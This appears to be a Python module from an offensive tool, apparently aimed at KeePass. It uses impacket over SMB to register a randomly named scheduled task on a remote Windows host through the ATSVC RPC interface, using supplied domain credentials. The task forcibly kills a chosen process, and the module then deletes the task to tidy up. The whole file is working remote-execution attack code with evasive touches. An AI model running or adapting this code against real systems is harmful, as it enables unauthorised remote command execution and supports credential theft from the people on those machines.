#!/usr/bin/python3

import os
import time
import random
from datetime import datetime
import friendlywords as fw

from impacket.examples.utils import parse_target
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, \
    RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.dcerpc.v5.tsch import TASK_USER_CRED, TASK_USER_CRED_ARRAY, LPTASK_USER_CRED_ARRAY

from axiom_keepass.core.parse_args import AxiomArgParser

def kill_process(smbClient, thread_index: int, process_name: str):
    stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % smbClient.getRemoteHost()
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    rpctransport.set_smb_connection(smbClient)
    dce = rpctransport.get_dce_rpc()
    dce.set_credentials(*rpctransport.get_credentials())
    if AxiomArgParser.GetProgramArgs().k is True: # type: ignore
        dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
    dce.connect()
    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    dce.bind(tsch.MSRPC_UUID_TSCHS)
    print(f"[THREAD {thread_index}][+] Successfully bound to ATSVC on {smbClient.getRemoteHost()}")

    task_name = fw.generate(1).capitalize()
    print(f"[THREAD {thread_index}][*] Using task name: {task_name} to kill process {process_name} on {smbClient.getRemoteHost()}")

    f = open(os.path.dirname(__file__) + '/../../Scripts/sch_task.xml', 'r')
    xml = f.read()
    f.close()
    xml = xml.replace('__DATE__', str(datetime.now()).replace(' ','T')) \
        .replace('__INTERVAL__', str(random.randint(1, 30))) \
        .replace('__BINARY__', 'taskkill') \
        .replace('__ARGS__', '/f /im:' + process_name)
        #.replace('__BINARY__', 'ping') \
        #.replace('__ARGS__', '-n 10 192.168.56.1')

    taskCreated = False
    try:
        target = AxiomArgParser.GetProgramArgs().target #type: ignore
        domain, username, password, target = parse_target(target)
        if username != '' and password != '':
            credsArray = TASK_USER_CRED_ARRAY()
            creds = TASK_USER_CRED()
            creds['userId'] = domain + "\\" + username
            creds['password'] = password
            creds['flags'] = 0
            credsArray.item = creds
            tsch.hSchRpcRegisterTask(
                dce,
                '\\%s' % task_name,
                xml,
                0x6,
                NULL,
                1,
                credsArray
            )
            taskCreated = True
        else:
            tsch.hSchRpcRegisterTask(
                dce,
                '\\%s' % task_name,
                xml,
                0x6,
                NULL,
                0
            )
            taskCreated = True

        tsch.hSchRpcRun(dce, '\\%s' % task_name)
    except tsch.DCERPCSessionError as e:
        print("[!] " + str(e))
        dce.disconnect()

    print(f"[THREAD {thread_index}][+] Scheduled task successfully started, process {process_name} will terminate on {smbClient.getRemoteHost()}")
    if taskCreated is True:
        for cnt in range(1,5):
            try:
                tsch.hSchRpcDelete(dce, '\\%s' % task_name)
                break
            except Exception as e:
                print(f"[THREAD {thread_index}][!] Failed {cnt} times to delete task {task_name} on target {smbClient.getRemoteHost()} ({str(e)}), retrying in 5 seconds")
                time.sleep(5)
    dce.disconnect()

